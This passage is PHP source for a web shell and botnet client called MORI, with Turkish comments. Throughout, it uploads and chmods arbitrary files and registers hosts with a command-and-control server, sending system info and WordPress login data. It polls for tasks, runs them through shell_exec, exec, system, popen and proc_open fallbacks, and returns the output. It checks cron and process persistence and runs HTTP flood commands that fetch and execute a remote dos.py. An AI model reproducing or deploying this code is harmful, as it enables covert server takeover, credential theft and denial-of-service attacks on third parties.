    $encoded_data = $_POST['data'] ?? '';
    $filename = $_POST['filename'] ?? '';
    
    // Validate
    if (empty($encoded_data) || empty($filename)) {
        http_response_code(400);
        echo json_encode(['error' => 'Missing data or filename', 'success' => false]);
        exit;
    }
    
    // Sanitize filename (prevent directory traversal)
    $filename = basename($filename);
    if (strpos($filename, '..') !== false || strpos($filename, '/') !== false) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid filename', 'success' => false]);
        exit;
    }
    
    // Base64 decode
    $file_content = @base64_decode($encoded_data, true);
    if ($file_content === false) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid base64 encoding', 'success' => false]);
        exit;
    }
    
    // Write file to current directory or temp
    $target_dir = sys_get_temp_dir();
    $target_path = $target_dir . '/' . $filename;
    
    // Try current dir first
    if (@is_writable(getcwd())) {
        $target_path = getcwd() . '/' . $filename;
    }
    
    // Write file
    $bytes_written = @file_put_contents($target_path, $file_content);
    if ($bytes_written === false) {
        http_response_code(500);
        echo json_encode(['error' => 'Failed to write file', 'success' => false]);
        exit;
    }
    
    // Make executable if .sh or .py
    @chmod($target_path, 0755);
    
    http_response_code(201);
    echo json_encode([
        'success' => true,
        'filename' => $filename,
        'path' => $target_path,
        'size' => strlen($file_content),
        'message' => 'File uploaded successfully'
    ]);
    exit;
}

// REGISTER DATA ENDPOINT - C2 server pulls system info from here
if (isset($_GET['act']) && $_GET['act'] === 'register_data') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(collect_system_info());
    exit;
}

// PERSISTENCE STATUS ENDPOINT - Report persistence layer status
if (isset($_GET['act']) && $_GET['act'] === 'persistence_status') {
    header('Content-Type: application/json; charset=utf-8');
    
    $persistence_info = [
        'backup_locations' => [],
        'cron_job' => false,
        'wordpress_hooks' => false,
        'daemon_processes' => [],
        'checked_at' => date('c')
    ];
    
    // Backup locations - check common persistence paths
    $backup_paths = [
        '/tmp',
        '/var/tmp',
        '/dev/shm',
        '/home',
        '/root',
        sys_get_temp_dir()
    ];
    
    foreach ($backup_paths as $path) {
        if (@is_dir($path) && @is_writable($path)) {
            // Look for shell backups in this directory
            $shell_name = basename($GLOBALS['C2_SHELL'] ?? __FILE__);
            $pattern = $path . '/*' . $shell_name;
            $matches = @glob($pattern, GLOB_NOSORT);
            if ($matches && count($matches) > 0) {
                foreach ($matches as $match) {
                    if (@file_exists($match)) {
                        $persistence_info['backup_locations'][] = $match;
                    }
                }
            }
        }
    }
    
    // Check for cron job
    if (function_exists('shell_exec')) {
        $crontab = @shell_exec('crontab -l 2>/dev/null');
        if ($crontab && (strpos($crontab, $GLOBALS['CLIENT_ID'] ?? 'mori') !== false || 
                         strpos($crontab, basename($GLOBALS['C2_SHELL'] ?? __FILE__)) !== false)) {
            $persistence_info['cron_job'] = true;
        }
    }
    
    // Check for WordPress hooks (wp_options table modifications)
    if (defined('ABSPATH') && defined('DB_NAME')) {
        // WordPress environment detected
        $persistence_info['wordpress_hooks'] = true;
    }
    
    // Check for daemon processes
    if (function_exists('shell_exec')) {
        $ps = @shell_exec('ps aux 2>/dev/null');
        if ($ps) {
            $client_id = $GLOBALS['CLIENT_ID'] ?? 'mori';
            $shell_name = basename($GLOBALS['C2_SHELL'] ?? __FILE__);
            foreach (explode("\n", $ps) as $line) {
                if ((strpos($line, $client_id) !== false || strpos($line, $shell_name) !== false) && 
                    strpos($line, 'grep') === false) {
                    // Extract PID
                    $parts = preg_split('/\s+/', trim($line));
                    if (isset($parts[1])) {
                        $persistence_info['daemon_processes'][] = (int)$parts[1];
                    }
                }
            }
            // Remove duplicates
            $persistence_info['daemon_processes'] = array_unique($persistence_info['daemon_processes']);
        }
    }
    
    echo json_encode($persistence_info, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit;
}
if (isset($_GET['task'])) {
    echo @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']) ?: "[WAIT]";
    exit;
}

// CLI Daemon mode — cron veya direkt çalışma
if (php_sapi_name() === 'cli') {
    // Prevent cron process accumulation: exit immediately if another instance is running
    $cli_lock_file = sys_get_temp_dir() . '/.mori_cli_' . substr(md5(SHELL_PATH), 0, 8) . '.lk';
    $cli_lock_fp   = @fopen($cli_lock_file, 'w');
    if (!$cli_lock_fp || !@flock($cli_lock_fp, LOCK_EX | LOCK_NB)) {
        exit(0); // already running — silently exit
    }

    // Exit before next cron tick so the next tick can start fresh (cron = 5min = 300s)
    $cli_max_runtime = 290;
    $cli_start_time  = time();

    @ProcessMasker::mask();

    // Queue dosyasını işle (web PHP'de exec kısıtlıysa CLI burada çalışır)
    $queue_file = __DIR__ . '/.mori_exec_queue';
    if (@file_exists($queue_file) && @filesize($queue_file) > 2) {
        $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
        @file_put_contents($queue_file, '[]', LOCK_EX); // Temizle
        foreach ($queue as $item) {
            $qcmd = $item['cmd'] ?? '';
            if (!empty($qcmd)) {
                $qout = execute_system_command($qcmd);
                @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $qcmd, "[QUEUE_EXEC] " . $qout, null);
            }
        }
    }

    $error_sentinels = ['no_task', 'db_unavailable', 'error', '[WAIT]', '[NO_ID]'];
    $idle_streak  = 0;   // consecutive no-task polls
    $next_poll_in = 30;  // seconds until next poll (server may override)

    while (true) {
        // Exit cleanly before next cron tick to prevent process accumulation
        if ((time() - $cli_start_time) >= $cli_max_runtime) break;

        $task_raw = @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
        $cmd          = null;
        $task_id      = null;
        $retry_after  = null;

        if ($task_raw) {
            $task_decoded = @json_decode($task_raw, true);
            if (is_array($task_decoded)) {
                $retry_after = isset($task_decoded['retry_after']) ? (int)$task_decoded['retry_after'] : null;
                $raw_cmd     = $task_decoded['command'] ?? '';
                if ($raw_cmd && !in_array($raw_cmd, $error_sentinels, true)) {
                    $cmd     = $raw_cmd;
                    $task_id = $task_decoded['id'] ?? null;
                }
            } elseif (!in_array($task_raw, $error_sentinels, true)) {
                $cmd = $task_raw;
            }
        }

        if ($cmd) {
            $out = execute_command($cmd);
            @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $cmd, $out, $task_id);
            $idle_streak  = 0;
            $next_poll_in = $retry_after ?? 5; // task just ran → check again soon
        } else {
            $idle_streak++;
            // Exponential backoff: 30s → 60s after 10 idle polls
            $backoff      = $idle_streak > 10 ? 60 : 30;
            $next_poll_in = $retry_after ?? $backoff;
        }

        // Process local exec queue each cycle
        if (@file_exists($queue_file) && @filesize($queue_file) > 2) {
            $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
            @file_put_contents($queue_file, '[]', LOCK_EX);
            foreach ($queue as $item) {
                $qcmd = $item['cmd'] ?? '';
                if (!empty($qcmd)) {
                    $qout = execute_system_command($qcmd);
                    @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $qcmd, "[QUEUE] " . $qout, null);
                }
            }
        }

        sleep($next_poll_in);
    }

    // Release lock so the next cron tick can acquire it
    @flock($cli_lock_fp, LOCK_UN);
    @fclose($cli_lock_fp);
    exit(0);
}

// No output - shell is silent

function http_get($url) {
    return http_request('GET', $url);
}

function http_post($url, $data) {
    return http_request('POST', $url, $data);
}

function fetch_url_content($url, $timeout = 15) {
    $url = trim($url);
    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
        return false;
    }

    // YÖNTEM 1: cURL (en güvenilir)
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
        $result = @curl_exec($ch);
        curl_close($ch);
        if ($result !== false && strlen($result) > 0) {
            return $result;
        }
    }

    // YÖNTEM 2: file_get_contents with stream context
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['method' => 'GET', 'timeout' => $timeout, 'ignore_errors' => true, 'follow_location' => 1, 'max_redirects' => 3],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        $result = @file_get_contents($url, false, $context);
        if ($result !== false && strlen($result) > 0) {
            return $result;
        }
    }

    // YÖNTEM 3: fopen fallback
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['method' => 'GET', 'timeout' => $timeout, 'ignore_errors' => true, 'follow_location' => 1, 'max_redirects' => 3],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        $fp = @fopen($url, 'rb', false, $context);
        if ($fp) {
            $result = '';
            while (!feof($fp) && strlen($result) < 10485760) { // 10MB max
                $chunk = fread($fp, 8192);
                if ($chunk === false) break;
                $result .= $chunk;
            }
            fclose($fp);
            if ($result !== '' && strlen($result) > 0) {
                return $result;
            }
        }
    }

    return false;
}

function download_remote_file($url, $filename) {
    $content = fetch_url_content($url);
    if ($content === false) {
        return "[ERROR] URL fetch failed: $url";
    }

    // Absolute path → use directly; relative → resolve under __DIR__
    if ($filename !== '' && ($filename[0] === '/' || $filename[0] === '\\')) {
        $target = $filename;
    } else {
        $target = __DIR__ . '/' . ltrim($filename, '/\\');
    }

    $dir = dirname($target);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }

    $written = @file_put_contents($target, $content);
    if ($written === false) {
        return "[ERROR] Cannot write file: $target";
    }

    // Auto-chmod scripts executable
    $ext = strtolower(pathinfo($target, PATHINFO_EXTENSION));
    @chmod($target, in_array($ext, ['py', 'sh', 'pl', 'rb']) ? 0755 : 0644);
    return "OK: downloaded $url to $target ($written bytes)";
}

function get_server_persistence_url() {
    global $C2_SERVER, $persistence_default_url;
    $c2_server = $C2_SERVER;
    $url = $persistence_default_url;

    $urlver_token = md5('mori_c2_secret_2024_persistence');
    $response = @http_get($c2_server . '?urlver&token=' . $urlver_token);
    if ($response) {
        $response = trim($response);
        if (filter_var($response, FILTER_VALIDATE_URL)) {
            return $response;
        }
    }

    $response = @http_get($c2_server . '?act=persistence_get');
    if ($response) {
        $json = json_decode($response, true);
        if (is_array($json) && isset($json['url']) && filter_var($json['url'], FILTER_VALIDATE_URL)) {
            $url = $json['url'];
        }
    }

    return $url;
}

// =====================================================
// VERİ KODLAMA İŞLEMLERİ
// =====================================================
function safe_base64_encode($data) {
    return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data));
}

function safe_base64_decode($data) {
    $data = str_replace(['-', '_'], ['+', '/'], $data);
    $padding = 4 - (strlen($data) % 4);
    if ($padding !== 4) {
        $data .= str_repeat('=', $padding);
    }
    return base64_decode($data, true);
}

function safe_json_encode($data) {
    return json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
}

// =====================================================
// GELİŞMİŞ SİSTEM BİLGİ TOPLAMA
// =====================================================
function collect_system_info() {
    global $is_windows;
    
    $info = [
        'os' => [
            'type' => PHP_OS ?? 'unknown',
            'family' => detect_os_family(),
            'hostname' => @gethostname() ?: 'unknown',
            'arch' => @php_uname('m') ?: 'unknown',
            'kernel' => @php_uname('r') ?: 'unknown',
            'full' => @php_uname('a') ?: 'unknown'
        ],
        'web' => [
            'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
            'user' => get_current_user(),
            'cwd' => getcwd() ?: __DIR__,
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
            'script_path' => __FILE__,
            'web_shell_url' => $GLOBALS['web_shell_url'] ?? 'unknown',
            'server_ip' => $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'unknown',
            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
        ],
        'php' => [
            'version' => PHP_VERSION,
            'sapi' => php_sapi_name(),
            'extensions' => get_loaded_extensions(),
            'disabled_functions' => ini_get('disable_functions'),
            'memory_limit' => ini_get('memory_limit'),
            'max_execution_time' => ini_get('max_execution_time')
        ],
        'disk' => [
            'total' => @disk_total_space(__DIR__),
            'free' => @disk_free_space(__DIR__)
        ],
        'time' => [
            'timestamp' => time(),
            'timezone' => date_default_timezone_get(),
            'datetime' => date('Y-m-d H:i:s')
        ],
        'permissions' => [
            'can_read' => is_readable(__FILE__),
            'can_write' => is_writable(__DIR__),
            'can_execute' => is_executable(__FILE__)
        ]
    ];
    
    // Windows özel bilgiler
    if ($is_windows) {
        $info['windows'] = [
            'comspec' => getenv('COMSPEC'),
            'windir' => getenv('WINDIR'),
            'username' => getenv('USERNAME'),
            'computername' => getenv('COMPUTERNAME')
        ];
    }
    
    return $info;
}

function detect_os_family() {
    $os = strtoupper(PHP_OS);
    if (strpos($os, 'WIN') === 0) return 'WINDOWS';
    if (strpos($os, 'DAR') === 0) return 'MACOS';
    if (strpos($os, 'LINUX') === 0) return 'LINUX';
    if (strpos($os, 'BSD') !== false) return 'BSD';
    return 'UNKNOWN';
}

// =====================================================
// C2 API İŞLEMLERİ (GELİŞMİŞ)
// =====================================================
// C2 REGISTRATION - BACKGROUND & MAIN
// =====================================================

/**
 * Background registration - non-blocking, fail-fast
 * Used for auto-registration on first load
 * Never blocks page load (1 sec timeout max)
 */
function c2_register_background($server, $id, $override_url = null) {
    global $web_shell_url;
    $url = $override_url ?: $web_shell_url;

    try {
        $sysinfo = collect_system_info();
    } catch (Exception $e) {
        error_log("[c2_register_background] Sysinfo failed: " . $e->getMessage());
        return false;
    }

    // Include cached sister files (populated by ensure_persistence_v4 on previous run)
    $sister_cache = sys_get_temp_dir() . '/.mori_sister_cache.json';
    $sister_data  = @json_decode(@file_get_contents($sister_cache), true);
    $wp_creds     = generate_wp_login_credentials();

    $payload = [
        'id'            => $id,
        'web_shell_url' => $url,
        'sysinfo'       => $sysinfo,
        'sister_files'  => $sister_data['locations'] ?? [],
        'sister_urls'   => $sister_data['urls']      ?? [],
        'wp_login_id'   => $wp_creds['blogs_id'],
        'wp_login_hash' => $wp_creds['hash'],
        'timestamp'     => time(),
        'version'       => '3.0'
    ];

    $encoded = safe_base64_encode(safe_json_encode($payload));
    
    // ONE attempt only - fail-fast (1 second timeout)
    $result = @http_post_timeout($server . '?act=reg', $encoded, 1);
    
    $trimmed = trim($result ?? '');
    $reg_json = $trimmed ? @json_decode($trimmed, true) : null;
    $reg_ok = ($trimmed === 'ok') || (!empty($reg_json['success']));
    if ($result && $reg_ok) {
        error_log("[c2_register_background] SUCCESS");
        @file_put_contents(__DIR__ . '/.registered', time());
        return true;
    }

    error_log("[c2_register_background] FAILED or timeout: " . substr($trimmed, 0, 80));
    return false;
}

function http_post_timeout($url, $data, $timeout = 1) {
    // Very fast fallback - cURL only with strict timeout
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        // CURLOPT_TIMEOUT would int-cast 0.5 → 0 (infinite) — use TIMEOUT_MS only
        curl_setopt($ch, CURLOPT_TIMEOUT_MS, (int)($timeout * 1000));
        curl_setopt($ch, CURLOPT_USERAGENT, 'MORI-Agent/2.0');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        
        $result = @curl_exec($ch);
        @curl_close($ch);
        
        if ($result !== false && !empty($result)) {
            return $result;
        }
    }
    
    return null;
}

// =====================================================
function c2_register($server, $id) {
    global $web_shell_url;
    
    error_log("[c2_register] Starting with id=$id, server=$server");
    
    try {
        $sysinfo = collect_system_info();
        error_log("[c2_register] Sysinfo collected");
    } catch (Exception $e) {
        error_log("[c2_register] Exception in collect_system_info: " . $e->getMessage());
        return false;
    }

    $payload = [
        'id' => $id,
        'web_shell_url' => $web_shell_url,
        'sysinfo' => $sysinfo,
        'timestamp' => time(),
        'version' => '3.0'
    ];

    $encoded = safe_base64_encode(safe_json_encode($payload));
    error_log("[c2_register] Payload encoded: " . strlen($encoded) . " bytes");
    
    // Retry logic - 3 kez dene with SHORT sleeps
    for ($attempt = 1; $attempt <= 3; $attempt++) {
        error_log("[c2_register] Attempt $attempt/3");
        $result = http_post($server . '?act=reg', $encoded);
        
        // Null-safe response handling
        $result = $result ?: '';  // Convert null to empty string
        $result_preview = $result ? substr($result, 0, 100) : '(empty)';
        error_log("[c2_register] Response: " . $result_preview);
        
        // Check for success - accept both 'ok' string and JSON {success:true}
        $trimmed_r = trim($result);
        $json_r = $trimmed_r ? @json_decode($trimmed_r, true) : null;
        if (!empty($result) && ($trimmed_r === 'ok' || !empty($json_r['success']))) {
            error_log("[c2_register] SUCCESS!");
            
            // Guarantee write registration marker (retry if fails)
            $reg_file = __DIR__ . '/.registered';
            if (!@file_exists($reg_file) || @filesize($reg_file) < 5) {
                @file_put_contents($reg_file, time());
            }
            
            return true;
        }
        
        // Very SHORT sleep (0.5 sec instead of 2 sec)
        if ($attempt < 3) {
            usleep(500000); // 0.5 second instead of sleep(2)
        }
    }
    
    // Tüm denemeler başarısız olursa false döndür
    error_log("[c2_register] FAILED - All attempts failed");
    return false;
}

/**
 * BATCH REGISTRATION - Toplu client kaydı (1000+ site için ideal)
 * Tek HTTP isteğinde 50 client'ı kaydet
 * Crash riski %99 azalır (200 req → 4 req)
 */
function c2_register_batch($server, $clients_batch) {
    if (!is_array($clients_batch) || count($clients_batch) === 0) {
        return false;
    }

    // Max 50 client per batch
    $clients_batch = array_slice($clients_batch, 0, 50);

    $payload = [
        'clients' => $clients_batch,
        'batch_version' => '1.0',
        'batch_timestamp' => time()
    ];

    $encoded = safe_base64_encode(safe_json_encode($payload));
    
    // Retry logic - 3 kez dene
    for ($attempt = 1; $attempt <= 3; $attempt++) {
        $result = http_post($server . '?act=reg_batch', $encoded);
        
        // Null-safe null coalescing
        $result = $result ?: '';
        
        if (!empty($result)) {
            $decoded = json_decode($result, true);
            if (is_array($decoded) && ($decoded['batch_processed'] ?? false) === true) {
                error_log("[c2_register_batch] SUCCESS on attempt $attempt");
                return $decoded; // Success - döndür sonuç
            }
        }
        
        error_log("[c2_register_batch] Attempt $attempt/3 failed or invalid response");
        
        // İlk 2 denemede başarısızsa 1 saniye bekle
        if ($attempt < 3) {
            sleep(1);
        }
    }
    
    // Fallback: tek tek kayıt TRY (sadece 1x, loop yok)
    // Don't use retry logic here - already failed batch
    foreach ($clients_batch as $client) {
        $single_start = time();
        @c2_register_background($server, $client['id'], $client['web_shell_url'] ?? null);
        // Skip if taking too long
        if (time() - $single_start > 3) break;
    }
    
    return false;
}

function c2_get_task($server, $id) {
    $url = $server . '?act=get_task&id=' . urlencode($id);
    return http_get($url);
}

function c2_send_result($server, $id, $command, $output, $task_id = null) {
    $payload = [
        'id' => $id,
        'task_id' => $task_id,
        'command' => $command,
        'output' => safe_base64_encode($output),  // Standardized encoding
        'timestamp' => time()
    ];
    
    $encoded = safe_base64_encode(safe_json_encode($payload));
    return http_post($server . '?act=set_res', $encoded);
}

function c2_update_status($server, $id, $status = 'alive') {
    $payload = [
        'id' => $id,
        'status' => $status,
        'timestamp' => time()
    ];
    
    $encoded = safe_base64_encode(safe_json_encode($payload));
    return http_post($server . '?act=update', $encoded);
}

// =====================================================
// GELİŞMİŞ KOMUT ÇALIŞTIRMA MOTORU
// =====================================================
function execute_command($cmd) {
    global $is_windows;
    
    $cmd = trim($cmd);
    if (empty($cmd)) return '';
    
    $output = '';
    $methods = [];
    
    // ÖZEL KOMUTLAR (PHP CORE)
    
    // pwd / cd
    if ($cmd === 'pwd' || $cmd === 'cd') {
        return getcwd() ?: __DIR__;
    }
    
    // CD ile dizin değiştir (büyük/küçük harf bağımsız)
    // Handle both pure 'cd path' and 'cd path && othercmd'
    if (preg_match('/^cd\s+(?:[\'"])?([^\'"&]+?)(?:[\'"])?(?:\s*&&\s*(.*))?$/i', $cmd, $m)) {
        $path = trim($m[1]);
        $remaining_cmd = isset($m[2]) ? trim($m[2]) : '';
        
        if (@chdir($path)) {
            $cwd = getcwd();
            if (!empty($remaining_cmd)) {
                // If there's a command after &&, execute it in the new directory
                $result = execute_command($remaining_cmd);
                return $result;
            }
            return $cwd;
        }
        return "[ERROR] Cannot change to: $path";
    }
    
    // FILELIST - Dizin listele
    if (strpos($cmd, 'FILELIST ') === 0) {
        $path = trim(substr($cmd, 9)) ?: getcwd();
        return list_directory($path);
    }
    
    // FILEREAD - Dosya oku
    if (strpos($cmd, 'FILEREAD ') === 0) {
        $file = trim(substr($cmd, 9));
        return read_file($file);
    }
    
    // FILEWRITE - Dosya yaz
    if (strpos($cmd, 'FILEWRITE ') === 0) {
        $parts = explode(' ', $cmd, 3);
        if (count($parts) >= 3) {
            return write_file($parts[1], $parts[2]);
        }
        return "[ERROR] FILEWRITE <path> <base64_content>";
    }

    // DOWNLOADFILE - URL'den dosya indirip kaydet
    if (strpos($cmd, 'DOWNLOADFILE ') === 0 || strpos($cmd, 'DOWNLOADURL ') === 0) {
        $parts = preg_split('/\s+/', $cmd, 3);
        if (count($parts) >= 3) {
            return download_remote_file($parts[1], $parts[2]);
        }
        return "[ERROR] DOWNLOADFILE <url> <filename>";
    }
    
    // FILEDELETE - Dosya sil
    if (strpos($cmd, 'FILEDELETE ') === 0) {
        $file = trim(substr($cmd, 11));
        return delete_file($file);
    }
    
    // FILECOPY - Dosya kopyala
    if (strpos($cmd, 'FILECOPY ') === 0) {
        $parts = explode(' ', $cmd, 3);
        if (count($parts) >= 3) {
            return copy_file($parts[1], $parts[2]);
        }
        return "[ERROR] FILECOPY <source> <dest>";
    }
    
    // DIRCREATE - Dizin oluştur
    if (strpos($cmd, 'DIRCREATE ') === 0) {
        $path = trim(substr($cmd, 10));
        return create_directory($path);
    }
    
    // DIRDELETE - Dizin sil
    if (strpos($cmd, 'DIRDELETE ') === 0) {
        $path = trim(substr($cmd, 10));
        return delete_directory($path);
    }
    
    // SISTEM BILGILERI
    if ($cmd === 'sysinfo' || $cmd === 'system') {
        return json_encode(collect_system_info(), JSON_PRETTY_PRINT);
    }
    
    if ($cmd === 'whoami') {
        return get_current_user() ?: 'unknown';
    }
    
    if ($cmd === 'hostname') {
        return gethostname();
    }
    
    if ($cmd === 'dir' || $cmd === 'ls') {
        return list_directory(getcwd());
    }
    
    if ($cmd === 'clear' || $cmd === 'cls') {
        return '__CLEAR__';
    }
    
    // PHP_STRESS — shell olmadan native PHP HTTP flood
    // Sözdizimi: PHP_STRESS <target> <method> <duration> <threads> [refs] [max_cpu] [max_ram] [rpc]
    if (strpos($cmd, 'PHP_STRESS ') === 0) {
        $parts = preg_split('/\s+/', trim(substr($cmd, 11)));
        $target   = $parts[0] ?? '';
        $method   = strtoupper($parts[1] ?? 'GET');
        $duration = (int)($parts[2] ?? 20);
        $threads  = min((int)($parts[3] ?? 10), 50);
        $refs     = $parts[4] ?? '_';
        $max_cpu  = (int)($parts[5] ?? 80);
        $max_ram  = (int)($parts[6] ?? 75);
        $rpc      = (int)($parts[7] ?? 10);
        if (empty($target)) return '[ERROR] PHP_STRESS: hedef URL gerekli';
        return php_native_flood($target, $method, $duration, $threads, $rpc);
    }

    // MORI_STRESS — anında fire-and-forget, download+run tek bg komutu
    // Kullanım: MORI_STRESS <target> <method> <threads> [duration=300] [rpc=15]
    if (strpos($cmd, 'MORI_STRESS ') === 0) {
        ignore_user_abort(true);
        set_time_limit(0);
        $parts    = preg_split('/\s+/', trim(substr($cmd, 12)));
        $target   = $parts[0] ?? '';
        $method   = strtoupper($parts[1] ?? 'GET');
        $threads  = min((int)($parts[2] ?? 100), 500);
        $duration = min((int)($parts[3] ?? 300), 600);
        $rpc      = (int)($parts[4] ?? 15);
        if (empty($target)) return '[ERROR] MORI_STRESS: hedef gerekli';

        $python  = mori_find_python();
        $dl_url  = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/dos.py';
        $save    = (is_writable('/tmp') ? '/tmp' : (is_writable('/dev/shm') ? '/dev/shm' : sys_get_temp_dir())) . '/dos_mori.py';
        $run_args = escapeshellarg($target) . ' ' . escapeshellarg($method)
                  . ' ' . (int)$duration . ' ' . (int)$threads . ' _ 80 75 ' . (int)$rpc;

        // Önce önbellekte var mı bak (bloklamaz)
        $dos = null;
        foreach ([__DIR__, '/tmp', '/dev/shm', '/var/tmp', sys_get_temp_dir()] as $dir) {
            if (!is_dir($dir)) continue;
            foreach (['dos_mori.py', 'dos.py'] as $fn) {
                $p = $dir . '/' . $fn;
                if (@file_exists($p) && @filesize($p) > 1000) { $dos = $p; break 2; }
            }
            foreach (@glob($dir . '/dos.py*') ?: [] as $f) {
                if (@filesize($f) > 1000) { $dos = $f; break 2; }
            }
        }

        if ($dos) {
            // Zaten var — direkt çalıştır, anında döner
            $bg = 'nohup ' . escapeshellarg($python) . ' ' . escapeshellarg($dos)
                . ' ' . $run_args . ' > /dev/null 2>&1 &';
        } else {
            // Yok — indir+çalıştır tek nohup sh -c içinde, PHP bloklamaz
            $inline = 'curl -sLf ' . escapeshellarg($dl_url) . ' -o ' . escapeshellarg($save)
                    . ' 2>/dev/null || wget -qO ' . escapeshellarg($save) . ' ' . escapeshellarg($dl_url) . ' 2>/dev/null'
                    . '; ' . escapeshellarg($python) . ' ' . escapeshellarg($save) . ' ' . $run_args;
            $bg = 'nohup sh -c ' . escapeshellarg($inline) . ' > /dev/null 2>&1 &';
        }

        if (mori_exec_bg($bg))
            return '[STRESS_OK] ' . $target . ' | ' . $method . ' | ' . $threads . 't | ' . $duration . 's'
                 . ($dos ? '' : ' [dl+run bg]');

        if (function_exists('pcntl_fork') && !in_array('pcntl_fork', array_map('trim', explode(',', ini_get('disable_functions'))))) {
            $pid = @pcntl_fork();
            if ($pid === 0) { @shell_exec($bg); exit(0); }
            if ($pid  >  0) return '[STRESS_OK] ' . $target . ' | fork:' . $pid;
        }

        // exec tamamen kapalı → PHP native flood
        return php_native_flood($target, in_array($method, ['GET','POST','HEAD']) ? $method : 'GET', min($duration, 120), min($threads, 50), 30)
             . "\n[FALLBACK] exec disabled";
    }

    // SİSTEM KOMUTU ÇALIŞTIR
    return execute_system_command($cmd);
}

function execute_system_command($cmd) {
    $methods_tried = [];
    $cmd_pipe = $cmd . ' 2>&1';

    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'shell_exec';
        $result = @shell_exec($cmd_pipe);
        if ($result !== null) return $result;
    }

    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'exec';
        @exec($cmd_pipe, $output_lines, $return_var);
        if (!empty($output_lines)) return implode("\n", $output_lines);
    }

    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'system';
        ob_start();
        @system($cmd_pipe);
        $result = ob_get_clean();
        if ($result !== false && $result !== '') return $result;
    }

    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'passthru';
        ob_start();
        @passthru($cmd_pipe);
        $result = ob_get_clean();
        if ($result !== false && $result !== '') return $result;
    }

    if (function_exists('proc_open')) {
        $methods_tried[] = 'proc_open';
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = @proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            $combined = trim($stdout . ($stderr ? "\nSTDERR:\n" . $stderr : ''));
            if ($combined !== '') return $combined;
        }
    }

    if (function_exists('popen')) {
        $methods_tried[] = 'popen';
        $handle = @popen($cmd_pipe, 'r');
        if ($handle) {
            $result = '';
            while (!feof($handle)) {
                $result .= fgets($handle);
            }
            pclose($handle);
            if ($result !== '') return $result;
        }
    }

    // Stress komutu (dos.py) + exec yok → otomatik PHP native flood
    // Format: python3 /path/dos.py <target> <duration> <threads> [method]
    if (preg_match('/python[23]?\s+\S*dos\.py\s+(\S+)\s+(\d+)\s+(\d+)\s*(\S*)/i', $cmd, $m)) {
        $target   = $m[1];
        $duration = min((int)$m[2], 300);
        $threads  = min((int)$m[3], 50);
        $method   = strtoupper($m[4] ?: 'GET');
        if (!in_array($method, ['GET','POST','HEAD'], true)) $method = 'GET';
        return php_native_flood($target, $method, $duration, $threads, 30);
    }

    // pcntl_fork ile background exec (bazı VPS)
    if (function_exists('pcntl_fork') && (strpos($cmd, 'python') !== false || strpos($cmd, 'nohup') !== false)) {
        $pid = @pcntl_fork();
        if ($pid === 0) { @shell_exec($cmd . ' >/dev/null 2>&1 &'); exit(0); }
        if ($pid > 0)   { return '[STRESS_BG] Background\'da çalışıyor (pid:' . $pid . ')'; }
    }

    // Queue dosyasına yaz — cron (CLI PHP) 5dk içinde çalıştırır
    $queue_file = __DIR__ . '/.mori_exec_queue';
    $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
    $queue = array_filter($queue, fn($q) => (time() - ($q['t'] ?? 0)) < 3600);
    $queue[] = ['cmd' => $cmd, 't' => time(), 'qid' => uniqid()];
    @file_put_contents($queue_file, json_encode(array_values($queue)), LOCK_EX);

    return "[QUEUED] Shell kısıtlandı, komut kuyruğa alındı. Cron 5dk içinde çalıştıracak. Methods tried: " . implode(', ', $methods_tried);
}

